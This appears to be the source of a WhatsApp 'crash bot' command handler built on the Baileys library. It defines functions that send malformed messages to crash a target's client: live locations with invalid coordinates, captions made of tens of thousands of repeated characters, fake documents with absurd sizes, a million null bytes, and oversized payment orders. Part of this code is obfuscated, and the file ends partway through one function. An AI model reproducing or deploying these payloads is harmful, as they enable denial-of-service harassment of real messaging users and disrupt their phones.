module.exports = async (afgan, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await afgan.decodeJid(afgan.user.id)
const sender = m.key.fromMe ? (afgan.user.id.split(':')[0]+'@s.whatsapp.net' || afgan.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await afgan.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { Client } = require('ssh2');
const jsobfus = require('javascript-obfuscator');
const fakejpg = fs.readFileSync(`./src/bruhhh.jpg`)
const nulll = fs.readFileSync(`./image/nulll.jpg`)
const nulll2 = fs.readFileSync(`./image/nulll2.jpg`)
const mengkece = fs.readFileSync(`./image/mengkece.jpg`)
const latx = fs.readFileSync(`./image/latx.png`)
const fakedoc = fs.readFileSync(`./src/afganxcrash.apk`)
const bangke = fs.readFileSync(`./thumb.png`)
const cok = fs.readFileSync(`./thumb.png`)
const slayer07 = fs.readFileSync(`./lib/lowdb/adapters/image/slayer07.jpg`)
const hanjer = fs.readFileSync(`./lib/image/hanjer.jpg`)
const santet = fs.readFileSync(`./lib/lowdb/adapters/image/santet.jpg`)
const virgam = fs.readFileSync(`./lib/lowdb/adapters/image/virgam.png`)
const dokupalsu = fs.readFileSync(`./lib/lowdb/adapters/basedate/afgan.apk`)
const gampalsu = fs.readFileSync(`./lib/lowdb/adapters/basedate/afgan.jpg`)
const { ios } = require("./virtex/ios.js")
const { buttonafgan } = require("./lib/antibacot.js")
// BUAT NGEBLOK NOMOR LUAR YANG PASARAN
if (m.sender.startsWith('212')) return afgan.updateBlockStatus(m.sender, 'block')
if (m.sender.startsWith('48')) return afgan.updateBlockStatus(m.sender, 'block')
if (m.sender.startsWith('60')) return afgan.updateBlockStatus(m.sender, 'block')
// WARNA ACAK
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]
let run = runtime(process.uptime())
// PERINTAH IN CONSOLE
if (isCmd) {
console.log(chalk.white.bgRed.bold('Massage'), color(`[afgan]`, `green`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
}
        // HARI
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
        
// Read Database
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./all/database/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot
// BUTTON VIDEO
   afgan.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
      var video = await prepareWAMessageMedia({
         video: {
            url: opts && opts.video ? opts.video : ''
         }
      }, {
         upload: afgan.waUploadToServer
      })
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  header: {
                     hasMediaAttachment: true,
                     videoMessage: video.videoMessage,
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }, contextInfo: {
      externalAdReply: {
      title: global.namabot,
      body: `฿Ɏ ĐɆⱠ₮₳Ӿ₵Ɽ₳₴Ⱨ`,
      thumbnailUrl: global.imageurl,
      sourceUrl: global.isLink,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
               
               }
            }
         }
      }, {
         quoted
      })
      await afgan.sendPresenceUpdate('composing', jid)
      return afgan.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
const xbug2 = {

key: {

remoteJid: 'status@broadcast',

fromMe: false, 

participant: '0@s.whatsapp.net'

},

message: {

listResponseMessage: {

title: 'afgan'

}

}

}


const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍ĐɆⱠ₮₳ ₵Ɽ₳₴Ⱨ̿╮⭑ ☠️⃰͜͡؜ĐɆⱠ₮₳⃟🔥᜴#afgan999ཀ͜͡😈⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}




//=================================================//

var _0x1e2d5c=_0x11d6;(function(_0x3a36c4,_0x23845e){var _0x1340f2=_0x11d6,_0x423967=_0x3a36c4();while(!![]){try{var _0x58784a=parseInt(_0x1340f2(0xf4))/0x1+-parseInt(_0x1340f2(0xec))/0x2+parseInt(_0x1340f2(0xe9))/0x3*(parseInt(_0x1340f2(0xdc))/0x4)+parseInt(_0x1340f2(0xe2))/0x5*(parseInt(_0x1340f2(0xe0))/0x6)+-parseInt(_0x1340f2(0xe1))/0x7+-parseInt(_0x1340f2(0xf5))/0x8+parseInt(_0x1340f2(0xd0))/0x9;if(_0x58784a===_0x23845e)break;else _0x423967['push'](_0x423967['shift']());}catch(_0xd4c5ce){_0x423967['push'](_0x423967['shift']());}}}(_0x1a62,0x54f30));async function lokascrash(_0x4f6d21,_0xce0a0){var _0x21c83a=_0x11d6,_0x4418ba=generateWAMessageFromContent(_0x4f6d21,proto['Message'][_0x21c83a(0xef)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':'ⓧAʟᴡᴀʏsᴀғɢᴀɴCʀᴀsʜ.ᴡʜᴀᴛsᴀᴘᴘ.ᴄᴏᴍ༻'+'ꦾ'[_0x21c83a(0xeb)](0xc350),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':_0x4f6d21,'quoted':_0xce0a0});await afgan[_0x21c83a(0xcf)](_0x4f6d21,_0x4418ba['message'],{'participant':{'jid':_0x4f6d21},'messageId':_0x4418ba[_0x21c83a(0xf1)]['id']});}function _0x1a62(){var _0x7e476b=['whatsapp','{\x22currency\x22:\x22USD\x22,\x22payment_configuration\x22:\x22\x22,\x22payment_type\x22:\x22\x22,\x22transaction_id\x22:\x22\x22,\x22total_amount\x22:{\x22value\x22:879912500,\x22offset\x22:100},\x22reference_id\x22:\x224N88TZPXWUM\x22,\x22type\x22:\x22physical-goods\x22,\x22payment_method\x22:\x22\x22,\x22order\x22:{\x22status\x22:\x22pending\x22,\x22description\x22:\x22\x22,\x22subtotal\x22:{\x22value\x22:990000000,\x22offset\x22:100},\x22tax\x22:{\x22value\x22:8712000,\x22offset\x22:100},\x22discount\x22:{\x22value\x22:118800000,\x22offset\x22:100},\x22shipping\x22:{\x22value\x22:500,\x22offset\x22:100},\x22order_type\x22:\x22ORDER\x22,\x22items\x22:[{\x22retailer_id\x22:\x22custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\x22,\x22name\x22:\x22JAMUR\x22,\x22amount\x22:{\x22value\x22:1000000,\x22offset\x22:100},\x22quantity\x22:99},{\x22retailer_id\x22:\x22custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\x22,\x22name\x22:\x22Wortel\x22,\x22amount\x22:{\x22value\x22:5000000,\x22offset\x22:100},\x22quantity\x22:99},{\x22retailer_id\x22:\x22custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\x22,\x22name\x22:\x22ↈAʟᴡᴀʏsᴀғɢᴀɴ.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ\x22,\x22amount\x22:{\x22value\x22:4000000,\x22offset\x22:100},\x22quantity\x22:99}]},\x22additional_note\x22:\x22\x22}','1715880173','0@s.whatsapp.net','./lib/lowdb/adapters/image/virgam.png','1715881084144','INITIATED_BY_ME','29396JrOBrz','chat','waUploadToServer','FBPAY','1219146ePLNMy','3857903JGHTKQ','5lNzRPd','Message','1715876003','now','›\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ⓧAʟᴡᴀʏsᴀǫɪᴏᴏCʀᴀsʜ.ᴡʜᴀᴛsᴀᴘᴘ.ᴄᴏᴍ༻','ngaceng','global_search_new_chat','192JYcATA','image/webp','repeat','612558dIEoDX','review_and_pay','ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=','fromObject','10116','key','1679959486','4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=','222955cMBOSf','3722872DuOUjg','5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=','https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true','message','relayMessage','6968133TKMbxU','pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=','/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000','ⓧAʟᴡᴀʏsᴀǫɪᴏᴏCʀᴀsʜ.ᴡʜᴀᴛsᴀᴘᴘ.ᴄᴏᴍ༻','ↈAʟᴡᴀʏsᴀғɢᴀɴ.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ'];_0x1a62=function(){return _0x7e476b;};return _0x1a62();}function _0x11d6(_0x2d939e,_0x51e809){var _0x1a6244=_0x1a62();return _0x11d6=function(_0x11d62b,_0x53b752){_0x11d62b=_0x11d62b-0xcc;var _0x27cc03=_0x1a6244[_0x11d62b];return _0x27cc03;},_0x11d6(_0x2d939e,_0x51e809);}async function iponcrash(_0x1116b7){var _0x3eece9=_0x11d6;await afgan['relayMessage'](_0x1116b7,{'paymentInviteMessage':{'serviceType':_0x3eece9(0xdf),'expiryTimestamp':Date[_0x3eece9(0xe5)]()+0x6c258c00}},{'participant':{'jid':_0x1116b7}});}async function dokucrash(_0x4d91b5,_0x50837c){var _0x904d86=_0x11d6,_0x10c1c8=generateWAMessageFromContent(_0x4d91b5,proto[_0x904d86(0xe3)][_0x904d86(0xef)]({'documentMessage':{'url':'https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true','mimetype':_0x904d86(0xe7),'fileSha256':_0x904d86(0xee),'fileLength':'999999999','pageCount':0x3b9ac9ff,'mediaKey':_0x904d86(0xcc),'fileName':_0x904d86(0xd4)+'ꦾ'[_0x904d86(0xeb)](0xea60),'fileEncSha256':_0x904d86(0xd1),'directPath':'/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0','mediaKeyTimestamp':_0x904d86(0xd7)}}),{'userJid':_0x4d91b5,'quoted':_0x50837c});await afgan[_0x904d86(0xcf)](_0x4d91b5,_0x10c1c8[_0x904d86(0xce)],{'participant':{'jid':_0x4d91b5},'messageId':_0x10c1c8[_0x904d86(0xf1)]['id']});}async function crashasu(_0x12b93a,_0x14311a){var _0x1c7728=_0x11d6,_0x580993=generateWAMessageFromContent(_0x12b93a,proto[_0x1c7728(0xe3)][_0x1c7728(0xef)]({'stickerMessage':{'url':_0x1c7728(0xcd),'fileSha256':'CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=','fileEncSha256':'r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=','mediaKey':_0x1c7728(0xf3),'mimetype':_0x1c7728(0xea),'directPath':_0x1c7728(0xd2),'fileLength':_0x1c7728(0xf0),'mediaKeyTimestamp':_0x1c7728(0xe4),'isAnimated':![],'stickerSentTs':_0x1c7728(0xda),'isAvatar':![],'isAiSticker':![],'isLottie':![]}}),{'userJid':_0x12b93a,'quoted':_0x14311a});await afgan[_0x1c7728(0xcf)](_0x12b93a,_0x580993[_0x1c7728(0xce)],{'participant':{'jid':_0x12b93a},'messageId':_0x580993[_0x1c7728(0xf1)]['id']});}async function virgamcrash(_0x106fce,_0x162f86){var _0x422f67=_0x11d6,_0xc9ace7=generateWAMessageFromContent(_0x106fce,proto[_0x422f67(0xe3)][_0x422f67(0xef)]({'interactiveMessage':{'header':{'title':'ↈᴀʟᴡᴀʏsᴀғɢᴀɴ.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ','hasMediaAttachment':!![],...await prepareWAMessageMedia({'image':{'url':'https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg'}},{'upload':afgan[_0x422f67(0xde)]})},'body':{'text':''},'footer':{'text':_0x422f67(0xe6)},'nativeFlowMessage':{'messageParamsJson':'\x00'[_0x422f67(0xeb)](0xf4240)}}}),{'userJid':_0x106fce,'quoted':_0x162f86});await afgan[_0x422f67(0xcf)](_0x106fce,_0xc9ace7[_0x422f67(0xce)],{'participant':{'jid':_0x106fce},'messageId':_0xc9ace7[_0x422f67(0xf1)]['id']});}async function listcrash(_0x19d69b,_0x1896dd){var _0x327302=_0x11d6,_0x58f243=generateWAMessageFromContent(_0x19d69b,proto['Message'][_0x327302(0xef)]({'listMessage':{'title':_0x327302(0xd3)+'ꦾ'[_0x327302(0xeb)](0xe09c0),'footerText':_0x327302(0xd4),'description':_0x327302(0xd3),'buttonText':null,'listType':0x2,'productListInfo':{'productSections':[{'title':_0x327302(0xd4),'products':[{'productId':'4392524570816732'}]}],'productListHeaderImage':{'productId':'4392524570816732','jpegThumbnail':null},'businessOwnerJid':_0x327302(0xd8)}},'footer':_0x327302(0xd3),'contextInfo':{'expiration':0x93a80,'ephemeralSettingTimestamp':_0x327302(0xf2),'entryPointConversionSource':_0x327302(0xe8),'entryPointConversionApp':_0x327302(0xd5),'entryPointConversionDelaySeconds':0x9,'disappearingMode':{'initiator':_0x327302(0xdb)}},'selectListType':0x2,'product_header_info':{'product_header_info_id':0x4433e2e130,'product_header_is_rejected':![]}}),{'userJid':_0x19d69b,'quoted':afganbug});await afgan[_0x327302(0xcf)](_0x19d69b,_0x58f243[_0x327302(0xce)],{'participant':{'jid':_0x19d69b},'messageId':_0x58f243[_0x327302(0xf1)]['id']});}const afganrorr={'key':{'participant':'0@s.whatsapp.net',...m[_0x1e2d5c(0xdd)]?{'remoteJid':'status@broadcast'}:{}},'message':{'interactiveMessage':{'header':{'hasMediaAttachment':!![],'jpegThumbnail':fs['readFileSync'](_0x1e2d5c(0xd9))},'nativeFlowMessage':{'buttons':[{'name':_0x1e2d5c(0xed),'buttonParamsJson':_0x1e2d5c(0xd6)}]}}}};

//=================================================//
const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍ĐɆⱠ₮₳ ₵Ɽ₳₴Ⱨ╮⭑ ☠️⃰͜͡؜₴ɆⱠ₮₳⃟🔥᜴ # ĐɆⱠ₮₳999ཀ͜͡😈⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}





//=================================================//


const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": "🔥afgan - Multi Device",
    "description": "Pe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}

const ryoreqphone = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"requestPhoneNumberMessage": {
"contextinfo": 1
}
}
}

const ryovoice = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 9999999999,
"ptt": "true"
}
}
}

const fpoll = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"pollCreationMessage": {
"name": "p"
}
}
}

const ryobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `GANNXCRASH`
}
}
}

const ryobut = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
buttonsResponseMessage: {
selectedButtonId: 'GANNXCRASH',
type: 1,
response: {
selectedDisplayText: 'penis'
}
}
}
}

const ryocakep = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `🔥`,
jpegThumbnail: fakejpg,
caption: ` ĐɆⱠ₮₳ - Bug ? \n ⿻ ${m.body || m.mtype} `,
inviteExpiration: Date.now() + 1814400000
}
}
};

const qpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}



const qdoc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
documentMessage: {
title: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakedoc,
}
}
}
const qvn = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 359996400,
"ptt": "true"
}
}
}

const qtext = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"extendedTextMessage": {
"text": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"title": `⟠ afganXCRAS🔥 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
'jpegThumbnail': fakejpg,
}
}
}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": fakejpg,
},
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"description": `⟠ afganXCRAS🔥 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
"currencyCode": "IDR",
"priceAmount1000": "1000000000000000000",
"retailerId": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}

const qgif = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'gifPlayback': 'true',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qinvite = {
key: {
participant: "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": "m",
"groupName": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"caption": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qvideo = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
'viewOnce': true
}
}
}

const qloc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
locationMessage: {
name: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakejpg,
}
}
}

const qloc2 = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"liveLocationMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'jpegThumbnail': fakejpg,
}
}
}

const qcontact = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=0\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
'jpegThumbnail': fakejpg,
thumbnail: fakejpg,
sendEphemeral: true
}
}
}

let list = []
for (let i of ownerNumber) {
list.push({
displayName: await afgan.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await afgan.getName(i + '@s.whatsapp.net')}\n
FN:${await afgan.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:yoshii@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://youtube.com/@afgantech.i?si=1j_c48ZxWw99i-Tq
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await afgan.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/3ae4090b2a39d272d7914.jpg'
}

// FUNCTION OBFUSCATOR 
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `afgan`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

/// FUNCTION BUG 
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️࿆᷍🥷᜴͆ժׁׅ݊ꫀׁׅܻ݊ᥣׁׅ֪tׁׅɑׁׅ•ᝯׁ֒ꭈׁׅɑׁׅׅ꯱hׁׅ֮̿╮⭑ ☠️⃰͜͡؜ĐɆⱠ₮₳⃟🔥᜴▴𝒟𝐸𝐿𝒯𝒜𝒞𝑅𝒜𝒮𝐻ཀ͜͡😈⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await afgan.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
